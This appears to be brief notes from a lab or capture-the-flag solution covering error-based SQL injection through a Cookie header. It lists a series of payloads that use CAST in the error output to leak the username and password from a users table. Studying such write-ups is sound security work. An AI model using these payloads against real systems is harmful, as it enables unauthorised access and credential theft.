Cookie: Ncavaq8Y4nMaN3XN'

![](./img/other/1.png)

Get the error ->  SQLi

Cookie: Ncavaq8Y4nMaN3XN' and CAST((SELECT 1) AS int) -- -

![](./img/other/2.png)

Cookie: Ncavaq8Y4nMaN3XN' and 1=CAST((SELECT 1) AS int) -- -

No error

Cookie: Ncavaq8Y4nMaN3XN' and 1=CAST((SELECT username from users limit 1) AS int) -- -

![](./img/other/3.png)

May be character limit

Cookie: ' and 1=CAST((SELECT password from users limit 1) AS int) -- -

![](./img/other/4.png)

Leak value

![](./img/other/5.png)  